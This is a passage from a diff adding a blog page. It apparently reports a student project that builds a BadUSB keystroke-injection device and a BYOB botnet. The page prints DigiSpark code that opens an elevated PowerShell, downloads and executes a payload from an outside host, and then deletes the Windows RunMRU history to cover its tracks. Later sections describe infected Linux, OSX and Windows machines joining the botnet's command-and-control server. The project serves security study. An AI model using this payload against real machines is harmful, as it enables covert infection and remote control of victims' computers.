+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">sendKeyStroke</span><span class="p">(</span><span class="n">KEY_R</span><span class="p">,</span> <span class="n">MOD_GUI_LEFT</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">delay</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"powershell Start-Process powershell -Verb runAs"</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">sendKeyStroke</span><span class="p">(</span><span class="n">KEY_ENTER</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">delay</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">sendKeyStroke</span><span class="p">(</span><span class="n">KEY_Y</span><span class="p">,</span> <span class="n">MOD_ALT_LEFT</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">delay</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"$down = New-Object System.Net.WebClient; $url = 'https://sheep.casa/payloads/windows_payload.exe'; $file = 'windows_payload.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;"</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">delay</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">sendKeyStroke</span><span class="p">(</span><span class="n">KEY_R</span><span class="p">,</span> <span class="n">MOD_GUI_LEFT</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">delay</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
+  <span class="c1">// Clear run command history</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"reg delete HKEY_CURRENT_USER</span><span class="se">\\</span><span class="s">Software</span><span class="se">\\</span><span class="s">Microsoft</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">CurrentVersion</span><span class="se">\\</span><span class="s">Explorer</span><span class="se">\\</span><span class="s">RunMRU /va /f"</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">delay</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">sendKeyStroke</span><span class="p">(</span><span class="n">KEY_ENTER</span><span class="p">);</span>
+  <span class="n">DigiKeyboard</span><span class="p">.</span><span class="n">delay</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
+  <span class="n">digitalWrite</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">loop</span><span class="p">()</span> <span class="p">{}</span>
+</code></pre></div></div>
+<p>The above code opens powershell to download and execute our <code class="highlighter-rouge">windows_payload.exe</code>.</p>
+
+<h4 id="windows-payload-for-botnet">Windows Payload for Botnet</h4>
+<p>To generate a Windows client for our botnet, we must run the code from a Windows machine to create an executable. Unfortunately, BYOB has a significant amount of bugs at the moment, and cross platform compatibility is not as it claims to be. <strong>To successfully connect to our botnet from Windows, we needed to host the C&amp;C server on a Windows machine.</strong></p>
+
+<h2 id="examples">Examples</h2>
+
+<h3 id="video">Video</h3>
+
+<p><a href="https://sheep.casa/csc154_project.m4v">https://sheep.casa/csc154_project.m4v</a></p>
+
+<h3 id="linuxosx">Linux/OSX</h3>
+<p>Below is an example of a client connecting to the C&amp;C server. This is actually Ryan’s laptop connecting, after plugging the BadUSB device into it.</p>
+
+<p><img src="/wp-content/uploads/2019/12/infected.png" alt="infected" />
+<strong>Figure 11:</strong> Session on x at wartop (Ryan’s Laptop).</p>
+
+<h3 id="windows-1">Windows</h3>
+<p>Below is an example of a Windows client connecting to a Windows C&amp;C host,<br />
+<img src="/wp-content/uploads/2019/12/session_demo.png" alt="session_demo" /><br />
+<strong>Figure 12:</strong> Windows client connection.</p>
+
+<h2 id="conclusion">Conclusion</h2>
+<p>We’ve configured our BadUSB devices to infect Linux, Windows and OSX machines. Upon plugin, our device will execute a payload to join our Botnet. Below is an elaboration on the successes and failures of the project.</p>
+
+<h3 id="limitations">Limitations</h3>
+
+<h4 id="badusb-1">BadUSB</h4>
+
+<p>Ideally, the same BadUSB device would be able to infect Windows, OSX, and Linux. However, from what we’ve researched this may not be technically achievable given the way USB functions. There seems to be no way to query information from the machine, the device simply sends keystrokes blindly. At this time a DigiSpark must be configured to infect one specific operating system, because currently we do not have knowledge of how to detect which operating system a victim’s computer is running.</p>
+
+<p>We did attempt loading all of our payloads onto one device (Hail Mary). This failed because arbitrary keystrokes were executed on a machine either before or after that machine’s OS specific code was run. This resulted in unpredictable behavior, which prevented even the correct code from executing sometimes.</p>
+
+<h4 id="byob-botnet">BYOB Botnet</h4>
+
+<p>The botnet framework we chose to use is still very buggy. By the time we concluded that certain limitations could not be overcome, it was no longer an option to pivot the project to a new botnet framework. It turns out the cross platform compatibility of BYOB is not as it claims, as we were not able to connect windows victims to our Linux server. Although we compiled bots on both python 2 and 3, and tried numerous workarounds suggested on Github, it simply would not work. Issues <a href="https://github.com/malwaredllc/byob/issues/92">1</a>,<a href="https://github.com/malwaredllc/byob/issues/164">2</a> on the GitHub repository for the framework echo our own issues, yet remain unresolved. We raised an issue ourselves at the beginning of the semester, but it was not addressed at the time of writing this report.</p>
+
+<h3 id="further">Further</h3>
+<p>If we were to continue working on this project we would need to find a better botnet framework, or develop our own simple C&amp;C server to handle reverse shells from victims. The bugs in BYOB are too numerous for its lack of support from the developer.</p>
+
+<p>We would still like to explore the ability to infect all operating systems using the same BadUSB device, but as we said, it couldn’t be achieved at this time.</p>
+
+<h3 id="final-words">Final Words</h3>
+<p>Ultimately our BadUSB devices were extremely successful on all platforms, despite our inability to use the same device for each. Our botnet endeavor was less successful in the end, but we learned a great deal, and if we had time to continue the project we’re aware of what direction we would go in to achieve what we were trying to this semester. Time was our greatest limiting factor for this project.</p>
+
+<h2 id="references">References</h2>
+<ol>
+  <li><a href="https://github.com/malwaredllc/byob">Build Your Own Botnet</a></li>
+  <li><a href="https://github.com/kbeflo/digispark-payloads">DigiSpark Payloads</a>.</li>
+  <li><a href="https://digistump.com/board/index.php?topic=2612.0">DigiSpark Apple Keyboard Mod Explanation</a></li>
+  <li><a href="https://github.com/chris408/digispark-usbkey-board/blob/master/usbconfig.h">DigiSpark Apple Keyboard <code class="highlighter-rouge">usbconfig.h</code></a></li>
+</ol>
+
+    
+
+
+
+<div class="post-tags">
+  
+    
+    <a href="/tags/#badusb">
+    
+      <span class="icon">
+        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0 0h24v24H0z" fill="none"/>
+    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
+</svg>
+      </span>&nbsp;<span class="tag-name">BadUSB</span>
+    </a>
+  
+    
+    <a href="/tags/#botnet">
+    
+      <span class="icon">
+        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0 0h24v24H0z" fill="none"/>
+    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
+</svg>
+      </span>&nbsp;<span class="tag-name">Botnet</span>
+    </a>
+  
+    
+    <a href="/tags/#digispark">
+    
+      <span class="icon">
+        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0 0h24v24H0z" fill="none"/>
+    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
+</svg>
+      </span>&nbsp;<span class="tag-name">DigiSpark</span>
+    </a>
+  
+    
+    <a href="/tags/#byob">
+    
+      <span class="icon">
+        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0 0h24v24H0z" fill="none"/>
+    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
+</svg>
+      </span>&nbsp;<span class="tag-name">BYOB</span>
+    </a>
+  
+    
+    <a href="/tags/#build-your-own-botnet">
+    
+      <span class="icon">
+        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0 0h24v24H0z" fill="none"/>
+    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
+</svg>
+      </span>&nbsp;<span class="tag-name">Build Your Own Botnet</span>
+    </a>
+  
+</div>
+  </div>
+
+  
+  <section class="comments">
+    <h2>Comments</h2>
+    
+  <div id="disqus_thread">
+    <button class="disqus-load" onClick="loadDisqusComments()">
+      Load Comments
+    </button>
+  </div>
+  <script>
+
+  /**
+  *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW
+  *  TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+  *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT:s
+  *  https://disqus.com/admin/universalcode/#configuration-variables
+  */
+  var disqus_config = function () {
+      this.page.url = "http://0.0.0.0:4000/bad-usb-botnet/";  // Replace PAGE_URL with your page's canonical URL variable
+      this.page.identifier = "" || "http://0.0.0.0:4000/bad-usb-botnet/";// Replace PAGE_IDENTIFIER with your page's unique identifier variable
+  }
+  function loadDisqusComments() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = '//https-ryankozak-com.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+  }
+  </script>
+  <noscript>
+    Please enable JavaScript to view the
+    <a href="https://disqus.com/?ref_noscript">comments powered by Disqus</a>.
+  </noscript>
+
+
+
+  </section>
+
+  <section class="related">
+  <h2>Related Posts</h2>
+  <ul class="posts-list">
+    
+      <li>
+        <h3>
+          <a href="/luks-encrypted-arch-linux-on-pinebook-pro/">
+            Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root
+            <small>15 Dec 2020</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/hack-the-box-craft-traceback/">
+            Hack The Box - Traceback
+            <small>17 Aug 2020</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/hack-the-box-craft-traverxec/">
+            Hack The Box - Traverxec
+            <small>12 Apr 2020</small>
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</section>
+
+</div>
+
+    </main>
+
+    
+  </body>
+</html>
